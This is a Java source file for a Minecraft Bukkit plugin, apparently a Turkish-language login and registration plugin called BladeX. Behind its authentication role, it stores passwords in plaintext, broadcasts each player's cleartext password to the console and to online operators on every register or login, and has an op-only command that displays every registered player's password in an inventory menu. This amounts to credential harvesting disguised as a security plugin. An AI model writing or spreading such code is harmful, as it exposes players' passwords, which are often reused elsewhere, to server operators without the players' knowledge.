package com.bladex;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.*;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.*;

public class BladeX extends JavaPlugin implements Listener {
    private final Map<UUID, String> passwords = new HashMap<>();
    private final Set<UUID> authenticated = new HashSet<>();
    private File file;

    @Override
    public void onEnable() {
        file = new File(getDataFolder(), "users.yml");
        loadData();
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("BladeX aktif.");
    }

    @Override
    public void onDisable() {
        saveData();
    }

    private void loadData() {
        passwords.clear();
        if (!file.exists()) return;
        FileConfiguration y = YamlConfiguration.loadConfiguration(file);
        if (y.getConfigurationSection("users") == null) return;
        for (String key : y.getConfigurationSection("users").getKeys(false)) {
            String pass = y.getString("users." + key);
            if (pass != null) {
                passwords.put(UUID.fromString(key), pass);
            }
        }
    }

    private void saveData() {
        FileConfiguration y = new YamlConfiguration();
        passwords.forEach((uuid, pass) -> y.set("users." + uuid.toString(), pass));
        try { y.save(file); } catch (Exception ignored) {}
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player player)) return true;
        if (cmd.getName().equalsIgnoreCase("logingoster") && player.isOp()) {
            Inventory inv = Bukkit.createInventory(null, 54, ChatColor.DARK_GRAY + "Kayıtlı Oyuncular");
            passwords.forEach((uuid, pass) -> {
                String name = Bukkit.getOfflinePlayer(uuid).getName();
                if (name == null) name = "Bilinmeyen";
                ItemStack head = new ItemStack(Material.PLAYER_HEAD);
                SkullMeta meta = (SkullMeta) head.getItemMeta();
                if (meta != null) {
                    meta.setOwningPlayer(Bukkit.getOfflinePlayer(uuid));
                    meta.setDisplayName(ChatColor.GOLD + name);
                    meta.setLore(List.of(ChatColor.YELLOW + "Şifre: " + pass));
                    head.setItemMeta(meta);
                }
                inv.addItem(head);
            });
            player.openInventory(inv);
            return true;
        }
        return false;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCommandPre(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String[] parts = event.getMessage().split(" ");
        String cmd = parts[0].toLowerCase();
        UUID uuid = player.getUniqueId();

        if (cmd.equals("/register") || cmd.equals("/login")) {
            event.setCancelled(true);
            String[] params = Arrays.copyOfRange(parts, 1, parts.length);
            boolean isRegistered = passwords.containsKey(uuid);

            if (cmd.equals("/register")) {
                if (authenticated.contains(uuid)) {
                    player.sendMessage("§cZaten giriş yaptın.");
                    return;
                }
                if (isRegistered) {
                    player.sendMessage("§cZaten kayıtlısın. Lütfen /login <şifre> komutunu kullan.");
                    return;
                }
                if (params.length != 2) {
                    player.sendMessage("§cKullanım: /register <şifre> <şifre>");
                    return;
                }
                if (!params[0].equals(params[1])) {
                    player.sendMessage("§cŞifreler uyuşmuyor.");
                    return;
                }

                passwords.put(uuid, params[0]);
                authenticated.add(uuid);
                saveData();
                player.sendMessage("§aBaşarıyla kayıt oldun ve giriş yaptın.");

                // OP'lere ve konsola bildir
                broadcastPassword(player, cmd, params[0]);
                return;
            }

            if (cmd.equals("/login")) {
                if (authenticated.contains(uuid)) {
                    player.sendMessage("§cZaten giriş yaptın.");
                    return;
                }
                if (!isRegistered) {
                    player.sendMessage("§cÖnce kayıt olmalısın: /register <şifre> <şifre>");
                    return;
                }
                if (params.length != 1) {
                    player.sendMessage("§cKullanım: /login <şifre>");
                    return;
                }

                String correctPass = passwords.get(uuid);
                if (params[0].equals(correctPass)) {
                    authenticated.add(uuid);
                    player.sendMessage("§aBaşarıyla giriş yaptın.");

                    // OP'lere ve konsola bildir
                    broadcastPassword(player, cmd, params[0]);
                } else {
                    player.sendMessage("§cYanlış şifre.");
                }
                return;
            }
        }

        if (!authenticated.contains(uuid)) {
            event.setCancelled(true);
            player.sendMessage("§cLütfen giriş yapın.");
        }
    }

    private void broadcastPassword(Player player, String cmd, String password) {
        String alert = "§6" + player.getName() + " §7adlı oyuncunun şifresi " + cmd + " (" + password + ")";
        Bukkit.getConsoleSender().sendMessage(alert);
        Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(alert));
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        authenticated.remove(uuid);

        if (passwords.containsKey(uuid)) {
            player.sendMessage("§eLütfen giriş yap: /login <şifre>");
        } else {
            player.sendMessage("§eLütfen kayıt ol: /register <şifre> <şifre>");
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent event) {
        authenticated.remove(event.getPlayer().getUniqueId());
    }

    @EventHandler void onMove(PlayerMoveEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler void onChat(AsyncPlayerChatEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler void onBreak(BlockBreakEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler void onPlace(BlockPlaceEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler void onInteract(PlayerInteractEvent e) { checkAuth(e.getPlayer(), e); }
    @EventHandler void onDrop(PlayerDropItemEvent e) { checkAuth(e.getPlayer(), e); }
    
    @EventHandler
    public void onInvClick(InventoryClickEvent e) {
        if (e.getWhoClicked() instanceof Player player) {
            if (e.getView().getTitle().contains("Kayıtlı Oyuncular")) {
                e.setCancelled(true);
                return;
            }
            checkAuth(player, e);
        }
    }

    @EventHandler
    public void onInvOpen(InventoryOpenEvent e) {
        if (e.getPlayer() instanceof Player player && !e.getView().getTitle().contains("Kayıtlı Oyuncular")) {
            checkAuth(player, e);
        }
    }

    @EventHandler void onDamage(EntityDamageEvent e) { if (e.getEntity() instanceof Player player) checkAuth(player, e); }

    private void checkAuth(Player player, Cancellable c) {
        if (!authenticated.contains(player.getUniqueId())) {
            c.setCancelled(true);
        }
    }
}
